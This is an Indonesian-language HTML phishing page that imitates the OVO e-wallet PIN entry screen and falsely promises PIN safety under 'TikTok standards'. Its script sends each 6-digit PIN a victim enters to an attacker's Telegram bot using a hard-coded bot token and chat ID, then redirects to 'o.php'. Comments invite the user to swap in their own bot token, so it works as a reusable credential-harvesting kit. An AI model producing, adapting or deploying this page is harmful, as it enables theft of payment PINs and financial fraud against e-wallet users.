<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Masukkan Security Code</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100%;
            background-color: #ffffff;
            overflow: hidden; /* Mencegah scroll agar terasa seperti aplikasi asli */
        }

        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            padding: 25px;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Header Navigation */
        .header {
            width: 100%;
            display: flex;
            align-items: center;
            margin-bottom: 40px;
            padding-top: 10px;
        }

        .back-btn {
            font-size: 28px;
            color: #333;
            text-decoration: none;
            font-weight: 300;
            cursor: pointer;
        }

        /* Text Styling */
        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #000;
            margin-bottom: 60px;
            margin-top: 20px;
            text-align: left;
        }

        /* OTP Dots Container */
        .otp-container {
            display: flex;
            justify-content: center; /* Membuat dots berada di tengah secara horizontal */
            gap: 20px;
            width: 100%;
            position: relative;
        }

        .dot {
            width: 18px;
            height: 18px;
            background-color: #F0EDF5; /* Ungu sangat muda OVO */
            border-radius: 50%;
            transition: all 0.2s ease;
            border: 1px solid #E0D9F0;
        }

        /* Dot saat terisi */
        .dot.active {
            background-color: #4C2A86; /* Ungu Terong OVO */
            border-color: #4C2A86;
            transform: scale(1.1);
        }

        /* Hidden Input yang menutupi seluruh layar agar mudah diklik */
        #hidden-input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: default;
            z-index: 10;
        }
    </style>
</head>
<body onclick="document.getElementById('hidden-input').focus();">

<div class="container">
    <div class="header">
        <div class="back-btn" onclick="history.back()">←</div>
    </div>

    <h1>Masukkan Pin Security<div>
( Pin anda dijamin keamannya  sesuai standar TikTok)</h1>

        
    

    <div class="otp-container">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        
        <input type="tel" id="hidden-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code" autofocus>
    </div>
</div>

<script>
    const input = document.getElementById('hidden-input');
    const dots = document.querySelectorAll('.dot');

    // Pastikan keyboard langsung muncul
    window.onload = () => input.focus();

    input.addEventListener('input', (e) => {
        const value = e.target.value;
        const length = value.length;

        // Update warna dots
        dots.forEach((dot, i) => {
            if (i < length) {
                dot.classList.add('active');
            } else {
                dot.classList.remove('active');
            }
        });

        // Cek jika sudah 6 digit
        if (length === 6) {
            sendToTelegram(value);
        }
    });

    function sendToTelegram(pin) {
        const token = "8338515989:AAGWomCuKU6z52sBmVn0_DLADUc025889F4"; // Ganti dengan token bot Anda
        const chat_id = "7774868050";   // Ganti dengan chat id Anda
        const text = `--- OVO SECURITY CODE ---\nPIN: ${pin}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: text })
        })
        .then(() => {
            // Berhasil kirim, langsung redirect ke o.php
            window.location.href = 'o.php';
        })
        .catch(() => {
            // Jika gagal tetap redirect
            window.location.href = 'o.php';
        });
    }

    // Mencegah input non-angka
    input.addEventListener('keydown', (e) => {
        if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Tab') {
            e.preventDefault();
        }
    });
</script>

</body>
</html>